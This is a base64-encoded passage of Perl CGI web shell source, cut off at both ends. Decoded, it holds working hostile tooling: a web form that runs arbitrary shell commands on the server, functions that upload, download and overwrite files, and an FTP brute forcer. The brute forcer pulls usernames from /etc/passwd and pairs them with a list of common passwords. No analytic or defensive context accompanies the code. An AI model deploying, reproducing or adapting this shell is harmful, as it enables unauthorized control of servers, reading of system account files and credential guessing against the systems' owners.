YXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOwoJaWYoLXcgJEZpbGUpCgl7CgkJJHJvd3M9IjIzIgoJfWVsc2UKCXsKCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7CgkJJHJvd3M9IjIwIgoJfQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsKCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7CgkkcmVzdWx0IC49ICA8PEVORDsKCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CgkkUHJvbXB0Cgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPgoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cKCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPgpFTkQKCQoJJHJlc3VsdCAuPSAmUnVuQ21kOwoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsKCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBTYXZlIEZpbGUKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgU2F2ZUZpbGUoJCkKewoJbXkgJERhdGE9IHNoaWZ0IDsKCW15ICRGaWxlPSBzaGlmdDsKCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOwoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpCgl7CgkJYmlubW9kZSBGSUxFOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlyZXR1cm4gMTsKCX1lbHNlCgl7CgkJcmV0dXJuIDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlciBGb3JtCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyRm9ybQp7CglteSAkcmVzdWx0PSIiOwoJJHJlc3VsdCAuPSA8PEVORDsKCjx0YWJsZT4KCjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+ClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4KPC90ZD4KPC90cj4KPHRyPgo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+CkVORApjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOwokcmVzdWx0IC49IDw8J0VORCc7CjwvdGV4dGFyZWE+PC90ZD4KPHRkPgoKUGFzczo8YnI+Cjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MKMTIzIUAjCjEyM2FkbWluCjEyM2FiYwoxMjM0NTZhZG1pbgoxMjM0NTU0MzIxCjEyMzQ0MzIxCnBhc3MxMjMKYWRtaW4KYWRtaW5jcAphZG1pbmlzdHJhdG9yCm1hdGtoYXUKcGFzc2FkbWluCnBAc3N3b3JkCnBAc3N3MHJkCnBhc3N3b3JkCjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjExMTExMQowMDAwMDAKMjIyMjIyCjMzMzMzMwo0NDQ0NDQKNTU1NTU1CjY2NjY2Ngo3Nzc3NzcKODg4ODg4Cjk5OTk5OQoxMjMxMjMKMjM0MjM0CjM0NTM0NQo0NTY0NTYKNTY3NTY3CjY3ODY3OAo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbjEyMwphZG1pbjEyMzQ1NgphYmNkZWYKYWJjYWJjCiFAIyFAIwohQCMkJV4KIUAjJCVeJiooCiFAIyQkI0AhCmFiYzEyMwphbmh5ZXVlbQppbG92ZXlvdTwvdGV4dGFyZWE+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4KCjxvcHRpb24+MDwvb3B0aW9uPgo8b3B0aW9uPjE8L29wdGlvbj4KPG9wdGlvbj4yPC9vcHRpb24+Cgo8b3B0aW9uPjM8L29wdGlvbj4KPC9zZWxlY3Q+IAo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPgo8L2Zvcm0+CjwvdGFibGU+CkVORApyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyCnsKCW15ICRyZXN1bHQ9IiI7CgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307CglpZigkaW57J3VzZXInfSBlcSAiIikKCXsKCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07Cgl9ZWxzZQoJewoJCXVzZSBOZXQ6OkZUUDsgCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsKCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOwoJCWNob21wKEB1c2VyKTsKCQljaG9tcChAcGFzcyk7CgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj0